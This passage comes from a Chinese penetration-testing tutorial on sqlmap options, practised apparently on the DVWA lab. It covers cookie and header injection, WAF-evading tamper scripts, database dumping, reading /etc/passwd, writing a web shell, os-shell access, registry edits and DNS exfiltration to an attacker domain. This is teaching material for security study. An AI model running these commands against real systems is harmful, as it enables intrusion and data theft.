src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230202213339820.png" alt="image-20230202213339820"></p></li></ul></li></ul><h5 id="–param-del"><a href="#–param-del" class="headerlink" title="–param-del"></a>–param-del</h5><ul><li><p>当变量之间的分隔符不是使用<code>&amp;</code>，需要使用分隔符参数</p><ul><li><p><code>sqlmap -u &quot;http://1.1.1.1/a.php&quot; --data=&quot;q=foo;id=1&quot; --param-del=&quot;;&quot; -f</code></p><blockquote><p>–param-del会检查每一个变量的分隔符，将<code>&amp;</code>替换为<code>;</code>或者其他分隔符</p></blockquote></li></ul></li></ul><h5 id="–cookie"><a href="#–cookie" class="headerlink" title="–cookie"></a>–cookie</h5><ul><li>获取cookie</li></ul><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230202214710091.png" alt="image-20230202214710091"></p><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230202214748094.png" alt="image-20230202214748094"></p><ul><li>身份认证方式注入</li></ul><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230202214930072.png" alt="image-20230202214930072"></p><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230202215008866.png" alt="image-20230202215008866"></p><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230202215028642.png" alt="image-20230202215028642"></p><blockquote><p>只要拿到一个合法的cookie值，就可以以身份认证用户的身份交给<code>sqlmap</code>执行后续的命令</p></blockquote><h5 id="–random-agent-amp-–user-agent"><a href="#–random-agent-amp-–user-agent" class="headerlink" title="–random-agent&amp;–user-agent"></a>–random-agent&amp;–user-agent</h5><ul><li>使用<code>--random-agent</code></li></ul><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230202220807471.png" alt="image-20230202220807471"></p><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230202220753413.png" alt="image-20230202220753413"></p><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230202220724010.png" alt="image-20230202220724010"></p><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230202220706873.png" alt="image-20230202220706873"></p><ul><li>手动指定UA头</li></ul><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230202220952578.png" alt="image-20230202220952578"></p><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230202221003958.png" alt="image-20230202221003958"></p><h5 id="–host"><a href="#–host" class="headerlink" title="–host"></a>–host</h5><ul><li>修改host头</li></ul><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230202221458792.png" alt="image-20230202221458792"></p><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230202221447985.png" alt="image-20230202221447985"></p><ul><li>检查host头注入（level&#x3D;5）</li></ul><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230202221626393.png" alt="image-20230202221626393"></p><h5 id="–referer"><a href="#–referer" class="headerlink" title="–referer"></a>–referer</h5><ul><li>修改referer头</li></ul><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230202222050044.png" alt="image-20230202222050044"></p><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230202222039351.png" alt="image-20230202222039351"></p><h5 id="–headers"><a href="#–headers" class="headerlink" title="–headers"></a>–headers</h5><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230202222756425.png" alt="image-20230202222756425"></p><blockquote><p>–headers&#x3D;”Host:<a href="http://www.abc.com**/n**User-Agent:bbbbbbbbbbb%22%E5%85%B6%E4%B8%AD%60/n%60%E8%A1%A8%E7%A4%BA%E6%8D%A2%E8%A1%8C%EF%BC%8C%E7%94%B1%E4%BA%8E%60--headers%60%E5%8F%82%E6%95%B0%E9%9C%80%E8%A6%81%E6%8C%87%E5%AE%9A%E6%AF%8F%E8%A1%8C%E4%B8%80%E4%B8%AA%EF%BC%8C%E6%89%80%E4%BB%A5%E9%9C%80%E8%A6%81%E6%B7%BB%E5%8A%A0%E5%A4%9A%E4%B8%AAheader%E7%9A%84%E8%AF%9D%E7%94%A8%60/n%60%E6%9D%A5%E6%8D%A2%E8%A1%8C">www.abc.com**\n**User-Agent:bbbbbbbbbbb&quot;其中`\n`表示换行，由于`--headers`参数需要指定每行一个，所以需要添加多个header的话用`\n`来换行</a></p></blockquote><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230202222820615.png" alt="image-20230202222820615"></p><h5 id="–method-x3D-GET-x2F-POST"><a href="#–method-x3D-GET-x2F-POST" class="headerlink" title="–method&#x3D;GET&#x2F;POST"></a>–method&#x3D;GET&#x2F;POST</h5><ul><li>指定请求方法</li></ul><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230202223032127.png" alt="image-20230202223032127"></p><h5 id="–scope"><a href="#–scope" class="headerlink" title="–scope"></a>–scope</h5><ul><li>设置日志文件<strong>（图中应该是burp.log日志文件，不是burp.txt）</strong></li></ul><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230202102245148.png" alt="image-20230202102245148"></p><ul><li><p>产生访问请求</p><blockquote><p>此时burp.txt文件中产生了大量的数据</p></blockquote><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230202102636652.png" alt="image-20230202102636652"></p></li><li><p>使用sqlmap</p><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230202104848801.png" alt="image-20230202104848801"></p><blockquote><p>–level&#x3D;3表示扫描UA头</p></blockquote><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230202105028509.png" alt="image-20230202105028509"></p><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230202110609330.png" alt="image-20230202110609330"></p></li></ul><h4 id="Optimization"><a href="#Optimization" class="headerlink" title="Optimization"></a>Optimization</h4><blockquote><ul><li>优化性能</li><li>-o：开启前三个性能参数（除–threads参数）</li><li>–predict-output  # 预设的输出<ul><li>根据检测方法，比对返回值和<strong>统计表</strong>内容，不断缩小检测内容，提高检测效率</li><li>在统计表中比对：版本名、用户名、密码、Privileges、role、数据库名称、表名、列名</li><li>与–threads（线程）参数不兼容</li><li><strong>统计表</strong>：&#x2F;usr&#x2F;share&#x2F;sqlmap&#x2F;data&#x2F;txt&#x2F;common-outputs.txt</li></ul></li><li>–keep-alive<ul><li>使用http(s)长连接，性能好</li><li>与–proxy参数不兼容</li><li>长连接避免重复建立连接的网络开销，但大量长连接会严重占用服务器资源</li></ul></li><li>–null-connection<ul><li>只获取相应页面的大小值，而非页面具体内容</li><li>通常用于盲注判断 真 &#x2F; 假，降低网络带宽消耗</li><li>与–text-only参数不兼容（基于页面内容的比较判断 真 &#x2F; 假）</li></ul></li><li>–threads<ul><li>最大并发线程</li><li>盲注时每个线程获取一个字符（7次请求），获取完成后线程结束</li><li>默认值为1，建议不要超过10，否则可能影响站点可用性</li><li>与–predict-output参数不兼容</li></ul></li></ul></blockquote><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230202122832188.png" alt="image-20230202122832188"></p><h4 id="Injection"><a href="#Injection" class="headerlink" title="Injection"></a>Injection</h4><blockquote><ul><li><p>-p</p><ul><li>指定扫描参数，使<code>--level</code>失效</li><li>-p “user-agent,referer”</li></ul></li><li><p>–skip</p><ul><li>排除指定的扫描参数</li><li>–level&#x3D;5 –skip&#x3D;”id,user-agent”</li></ul></li><li><p>URI注入点</p><ul><li><code>sqlmap -u &quot;http://targeturl/param1/value1*/param2/value2*/&quot;</code></li></ul></li><li><p>–dbms</p><ul><li>指定数据库以及对应的版本号进行扫描探测</li><li>MySQL &lt;5.0&gt;、Oracle &lt;11i&gt;、Microsoft SQL Server &lt;2005&gt;、PostgreSQL、Microsoft Access、SQLite、Firebird、Sybase、SAP MaxDB、DB2</li></ul></li><li><p>–os</p><ul><li><p>指定目标操作系统</p></li><li><p>Linux、Windows</p></li></ul></li><li><p>–invalid-bignum &#x2F; –invalid-logical</p><ul><li>通常sqlmap使用负值使参数取值失效 id&#x3D;13—&gt;id&#x3D;-13</li><li>bignum使用大数使参数值失效 id&#x3D; 99999999</li><li>logical使用布尔判断使取值失效 id&#x3D;13 AND 18&#x3D;19</li></ul></li><li><p>–no-cast</p><ul><li>榨取数据时，sqlmap将所有结果转换为字符串，并用空格替换NULL结果</li><li>老版本mysql数据库需要开启此开关进行注入</li></ul></li><li><p>–no-escape   # 不逃逸</p><ul><li>出于混淆和避免出错的目的，payload中用单引号界定字符串时，sqlmap使用char()编码逃逸的方法替换字符串</li><li>SELECT ‘foo’  —&gt;  SELECT CHAR(102)+CHAR(111)+CHAR(111)</li><li>本参数将关闭此功能</li></ul></li><li><p>–prefix &#x2F; –suffix   # 前缀 &#x2F; 后缀</p></li><li><p>例：<code>$query = &quot;SELECT * FROM users WHERE id=(&#39;&quot; . $_GET[&#39;id&#39;] . &quot;&#39;) LIMIT 0, 1&quot;;</code></p></li><li><p>注入命令：<code>sqlmap -u &quot;http://1.1.1.1/sqlmap/mysql/get_str_brackets.php?id=1&quot; -p id --prefix &quot;&#39;)&quot; --suffix &quot;AND (&#39;abc&#39;=&#39;abc&quot;</code></p></li><li><p>最终形成的注入语句：<code>query = &quot;SELECT * FROM users WHERE id=(&#39;1&#39;) &lt;PAYLOAD&gt; AND (&#39;abc&#39;=&#39;abc&#39;) LIMIT 0, 1&quot;;</code></p></li><li><p>–tamper </p><ul><li>混淆脚本，用于绕过应用层过滤、IPS、WAF</li><li><code>sqlmap -u “http://1.1.1.1/a.php?id=1” --tamper=&quot;tamper/between.py,tamper/randomcase.py,tamper/space2comment.py&quot; -v 3</code></li></ul></li></ul></blockquote><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230203113518787.png" alt="image-20230203113518787"></p><h5 id="p-指定参数注入"><a href="#p-指定参数注入" class="headerlink" title="-p 指定参数注入"></a>-p 指定参数注入</h5><blockquote><p>使用<code>-p</code>参数会使level值失效</p></blockquote><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230203114251356.png" alt="image-20230203114251356"></p><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230203114309492.png" alt="image-20230203114309492"></p><h5 id="–skip"><a href="#–skip" class="headerlink" title="–skip"></a>–skip</h5><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230203114614383.png" alt="image-20230203114614383"></p><h5 id="–dbms"><a href="#–dbms" class="headerlink" title="–dbms"></a>–dbms</h5><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230203115335155.png" alt="image-20230203115335155"></p><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230203115343739.png" alt="image-20230203115343739"></p><h5 id="–tamper"><a href="#–tamper" class="headerlink" title="–tamper"></a>–tamper</h5><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230203121954917.png" alt="image-20230203121954917"></p><h4 id="Detection"><a href="#Detection" class="headerlink" title="Detection"></a>Detection</h4><blockquote><ul><li>–level<ul><li>1-5级（默认1）</li><li>&#x2F;usr&#x2F;share&#x2F;sqlmap&#x2F;xml&#x2F;payloads</li></ul></li><li>–risk<ul><li>1-4（默认1 &#x2F; 无害）</li><li>Risk升高可造成数据被篡改等风险（update）</li></ul></li><li>–string, –not-string, –regexp, –code, –text-only, –titles<ul><li>页面比较，基于布尔的注入检测，依据返回页面内容的变化判断真假逻辑，但有些页面随时间阈值变化，此时需要人为指定标识真假的字符串</li></ul></li></ul></blockquote><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230203122141710.png" alt="image-20230203122141710"></p><h4 id="Techniques"><a href="#Techniques" class="headerlink" title="Techniques"></a>Techniques</h4><blockquote><ul><li>默认使用全部技术<ul><li>B: Boolean-based blind </li><li>E: Error-based </li><li>U: Union query-based </li><li>S: Stacked queries（文件系统、操作系统、注册表）</li><li>T: Time-based blind</li></ul></li><li>–time-sec<ul><li>基于时间的注入检测相应延迟时间（默认5s）</li></ul></li><li>–union-cols<ul><li>默认联合查询1-10例，随–level增加最多支持50例</li><li>–union-cols 6-9  # 指定查询6-9列</li></ul></li><li>–union-char<ul><li>联合查询默认使用NULL，极端情况下NULL可能失败，此时可以手动指定数值</li><li>–union-char 123</li></ul></li><li>–dns-domain<ul><li>攻击者控制了某DNS服务器，使用此功能可以提高数据榨取的速度</li><li>—dns-domain attacker.com</li></ul></li><li>–second-order<ul><li>在一个页面注入的结果，从另一个页面体现出来</li><li><code>--second-order http://1.1.1.1/b.php</code></li></ul></li></ul></blockquote><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230203122652463.png" alt="image-20230203122652463"></p><h4 id="Fingerprint"><a href="#Fingerprint" class="headerlink" title="Fingerprint"></a>Fingerprint</h4><blockquote><ul><li>-f , –fingerprint , -b , –banner<ul><li>数据库管理系统指纹信息</li><li>DBMS，操作系统，架构，补丁</li></ul></li></ul></blockquote><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230203123857524.png" alt="image-20230203123857524"></p><h4 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h4><blockquote><ul><li><p>–current-user </p><ul><li>查询当前数据库管理系统的账号</li></ul></li><li><p>–current-db</p><ul><li>查询当前数据库</li></ul></li><li><p>–hostname</p><ul><li>查询当前主机名</li></ul></li><li><p>–users </p><ul><li>查询数据库中所有的用户账号</li></ul></li><li><p>–privileges -U username（CU 当前帐号）</p><ul><li><p>–privileges -CU</p></li><li><p>查询所有用户权限 &#x2F; 当前用户权限</p></li></ul></li><li><p>–roles </p><ul><li>查询数据库中的角色</li></ul></li><li><p>–dbs</p><ul><li>查询目标数据库中有哪些数据库</li></ul></li><li><p>–tables, –exclude-sysdbs –D dvwa</p><ul><li><p>–exclude-sysdbs       # 此参数表示排除系统库</p></li><li><p>查询DVWA数据库中有哪些表</p></li></ul></li><li><p>-T users -D dvwa -C user –columns</p><ul><li>查询DVWA数据库中user表中有哪些列</li></ul></li><li><p>–schema –batch –exclude-sysdbs 元数据（使用默认选项）</p><ul><li>schema数据库表结构</li><li>batch参数：注入过程中的所有选择项都使用默认选项</li></ul></li><li><p>–count </p><ul><li>查询过程中进行计数</li></ul></li><li><p>Dump数据</p><ul><li><p>–dump, -C, -T, -D, –start, –stop</p><ul><li>dump用来输出查询结果</li><li>start &#x2F; stop分段查询，防止被发现</li></ul></li><li><p>–dump-all –exclude-sysdbs</p></li></ul></li><li><p>–sql-query “select * from users”</p><ul><li>自定义sql语句进行查询</li></ul></li></ul></blockquote><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230203124130079.png" alt="image-20230203124130079"></p><h4 id="Brute-force"><a href="#Brute-force" class="headerlink" title="Brute force"></a>Brute force</h4><blockquote><ul><li><p>Mysql &lt; 5.0，没有information_schema库</p></li><li><p>Mysql &gt;&#x3D; 5.0，但无权读取information_schema库</p></li><li><p>微软的access数据库，默认无权读取MSysObjects库</p></li><li><p>–common-tables </p></li><li><p>–common-columns</p></li></ul></blockquote><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230203175030225.png" alt="image-20230203175030225"></p><h5 id="–common-tables"><a href="#–common-tables" class="headerlink" title="–common-tables"></a>–common-tables</h5><blockquote><p>参数使用条件：</p><p>没有information_schema库或者无权读取information_schema库</p></blockquote><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230203175750231.png" alt="image-20230203175750231"></p><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230203181757271.png" alt="image-20230203181757271"></p><h4 id="UDF-Injection"><a href="#UDF-Injection" class="headerlink" title="UDF Injection"></a>UDF Injection</h4><blockquote><ul><li><p>用户自定义函数</p></li><li><p>–udf-inject , –shared-lib</p><ul><li><p>编译共享库创建并上传至DB Server，以此生成UDF实现高级注入</p></li><li><p>Linux：shared object</p></li><li><p>Windows：DLL</p></li><li><p>UDF注入文档（需翻墙访问）</p><ul><li><p><a href="http://www.slideshare.net/inquis/advanced-sql-injection-to-operating-system">http://www.slideshare.net/inquis/advanced-sql-injection-to-operating-system</a></p><p>full-control-whitepaper-4633857</p></li></ul></li></ul></li></ul></blockquote><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230203180247658.png" alt="image-20230203180247658"></p><h4 id="FILE-SYSTEM"><a href="#FILE-SYSTEM" class="headerlink" title="FILE SYSTEM"></a>FILE SYSTEM</h4><blockquote><ul><li><p>–file-read&#x3D;”&#x2F;etc&#x2F;passwd” </p></li><li><p>–file-write&#x3D;”shell.php” –file-dest “&#x2F;tmp&#x2F;shell.php”</p></li><li><p>–file-dest</p><ul><li>写入上传shell目标地址</li></ul></li></ul></blockquote><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230203180827652.png" alt="image-20230203180827652"></p><h5 id="–file-read"><a href="#–file-read" class="headerlink" title="–file-read"></a>–file-read</h5><blockquote><p>读取&#x2F;etc&#x2F;passwd文件</p></blockquote><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230203181021255.png" alt="image-20230203181021255"></p><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230203181636377.png" alt="image-20230203181636377"></p><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230203181648584.png" alt="image-20230203181648584"></p><h5 id="–file-write"><a href="#–file-write" class="headerlink" title="–file-write"></a>–file-write</h5><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230203181939420.png" alt="image-20230203181939420"></p><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230203182046784.png" alt="image-20230203182046784"></p><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230203182231764.png" alt="image-20230203182231764"></p><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230203182319611.png" alt="image-20230203182319611"></p><h4 id="OS"><a href="#OS" class="headerlink" title="OS"></a>OS</h4><blockquote><ul><li>Mysql ̵postgresql<ul><li>上传共享库并生成sys_exec()̵ sys_eval()两个UDF</li></ul></li><li>Mssql<ul><li>xp_cmdshell存储过程（有就直接用、被禁了直接启动，没有就建直接立）</li></ul></li><li>–sql-shell </li><li>–os-shell </li><li>–os-cmd</li></ul></blockquote><p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230203182400762.png" alt="image-20230203182400762"></p><h4 id="WINDOWS-REGISTORY（注册表）"><a href="#WINDOWS-REGISTORY（注册表）" class="headerlink" title="WINDOWS REGISTORY（注册表）"></a>WINDOWS REGISTORY（注册表）</h4><blockquote><ul><li>–reg-read <ul><li>读取键值表键值</li></ul></li><li>–reg-add <ul><li>增加键值表键值</li></ul></li><li>–reg-del <ul><li>删除键值表键值</li></ul></li><li>–reg-key<ul><li>键值名</li></ul></li><li>–reg-value̵<ul><li>键值的值</li></ul></li><li>–reg-data̵<ul><li>键值具体数据内容</li></ul></li><li>–reg-type <ul><li>键值类型</li></ul></li><li>sqlmap –u&#x3D;”<a href="http://1.1.1.1/a.aspx?id=1">http://1.1.1.1/a.aspx?id=1</a>“ –reg-add –reg key&#x3D;”HKEY_LOCAL_MACHINE\SOFTWARE\sqlmap” –reg-value&#x3D;Test –reg-type&#x3D;REG_SZ –reg-data&#x3D;1</li></ul><p><strong>操作系统账号需要有写入执行权限</strong></p></blockquote><p><img 